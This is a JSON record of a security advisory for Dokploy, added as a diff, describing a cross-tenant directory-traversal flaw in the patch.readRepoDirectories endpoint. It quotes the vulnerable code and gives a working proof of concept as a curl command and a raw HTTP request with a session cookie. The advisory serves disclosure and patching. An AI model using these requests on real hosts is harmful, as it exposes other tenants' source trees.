@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-q7cq-vxv7-449c",
+  "aliases": [],
+  "title": "Authenticated directory traversal in `patch.readRepoDirectories` lets any member enumerate the file tree of any git repository on the host, including other tenants' source",
+  "summary": "### Summary\n\nThe `patch.readRepoDirectories` tRPC procedure takes a `repoPath` string straight from the caller and runs `git ls-tree` inside it. The value is never confined to the caller's own patch-repo directory, so a member with read access to one service can point `repoPath` at any path on the host (or a managed server) and list the tracked files of the git repository there - for example another organization's deployed application source under `/etc/dokploy/applications/<other-app>/code`. It is cross-tenant information disclosure of directory and file names.\r\n\n\n### Details\n\nFrom `apps/dokploy/server/api/routers/patch.ts`:\r\n\r\n```ts\r\nreadRepoDirectories: protectedProcedure\r\n\t.input(\r\n\t\tz.object({\r\n\t\t\tid: z.string().min(1),\r\n\t\t\ttype: z.enum([\"application\", \"compose\"]),\r\n\t\t\trepoPath: z.string(),          // <-- used verbatim as the working directory\r\n\t\t}),\r\n\t)\r\n\t.query(async ({ input, ctx }) => {\r\n\t\tawait checkServicePermissionAndAccess(ctx, input.id, {\r\n\t\t\tservice: [\"read\"],\r\n\t\t});\r\n\t\t// serverId resolved from the service...\r\n\t\treturn await readPatchRepoDirectory(input.repoPath, serverId);\r\n\t}),\r\n```\r\n\r\nAnd the sink in `packages/server/src/services/patch-repo.ts`:\r\n\r\n```ts\r\nexport const readPatchRepoDirectory = async (repoPath: string, serverId?) => {\r\n\tconst command = `cd ${quote([repoPath])} && git ls-tree -r --name-only HEAD`;\r\n\t// exec locally or on the remote server, parse stdout into a tree\r\n};\r\n```\r\n\r\n`repoPath` is attacker-controlled and absolute. `quote()` (added for GHSA-56g6, which was a command-injection issue in this same function) blocks shell metacharacters, but the directory itself is still whatever the caller asks for. The authorization check (`service: [\"read\"]` on `input.id`) only proves the caller can read service `id`; it has no bearing on `repoPath`.\n\n### Proof of concept\n\nReusing the account, cookie and application from Advisory 1. To make the cross-tenant effect concrete, a second tenant's deployed-application repository is simulated at the real path Dokploy uses, `/etc/dokploy/applications/victim-corp/code`, containing one file named `prod-database-credentials.txt`. The attacker has no relationship to that service.\r\n\r\nReadable input:\r\n\r\n```json\r\n{\"0\":{\"json\":{\"id\":\"4avF15a1L2z-mKxpKQON1\",\"type\":\"application\",\"repoPath\":\"/etc/dokploy/applications/victim-corp/code\"}}}\r\n```\r\n\r\ncURL:\r\n\r\n```bash\r\ncurl -i -b cookies.txt \\\r\n  \"http://127.0.0.1:8020/api/trpc/patch.readRepoDirectories?batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22id%22%3A%224avF15a1L2z-mKxpKQON1%22%2C%22type%22%3A%22application%22%2C%22repoPath%22%3A%22/etc/dokploy/applications/victim-corp/code%22%7D%7D%7D\"\r\n```\r\n\r\nRaw HTTP request:\r\n\r\n```http\r\nGET /api/trpc/patch.readRepoDirectories?batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22id%22%3A%224avF15a1L2z-mKxpKQON1%22%2C%22type%22%3A%22application%22%2C%22repoPath%22%3A%22/etc/dokploy/applications/victim-corp/code%22%7D%7D%7D HTTP/1.1\r\nHost: 127.0.0.1:8020\r\nCookie: better-auth.session_token=YL6XrJByAf9fxICesnHBrHk7K3OEr7s2.TMuqwklJqI3S403Dqpk9fJgF4TeMf3AwR1IUcAKeLpw%3D\r\nAccept: */*\r\nConnection: keep-alive\r\n```\r\n\r\nRaw HTTP response:\r\n\r\n```http\r\nHTTP/1.1 200 OK\r\ncontent-type: application/json\r\nVary: trpc-accept, Accept-Encoding\r\nDate: Sat, 07 Nov 2026 07:49:23 GMT\r\n\r\n[{\"result\":{\"data\":{\"json\":[{\"name\":\"prod-database-credentials.txt\",\"path\":\"prod-database-credentials.txt\",\"type\":\"file\",\"children\":null}],\"meta\":{\"values\":{\"0.children\":[\"undefined\"]},\"v\":1}}}}]\r\n```\r\n\r\nThe attacker's service has nothing to do with `victim-corp`, yet the response lists that repository's files. Combined with Advisory 1 the attacker can then read the contents of any file it discovers this way.\r\n\n\n### Impact\n\nCross-tenant and host directory disclosure (CWE-22 / CWE-200). A member can map the source tree of any git repository on the Dokploy host or any managed server - other organizations' application and compose code, and anything else tracked in git under a known or guessed path. On its own it leaks structure an...",
+  "published_at": "2026-11-12T08:14:53.000Z",
+  "modified_at": "2026-11-12T08:14:53.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 5,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-22",
+    "CWE-200"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-q7cq-vxv7-449c",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-q7cq-vxv7-449c",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-q7cq-vxv7-449c",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:f78c386dfd477140cf5ebfe9764e1a1d5185dc8ee59ddb37645a070f4cf208af",
+  "note": null
+}
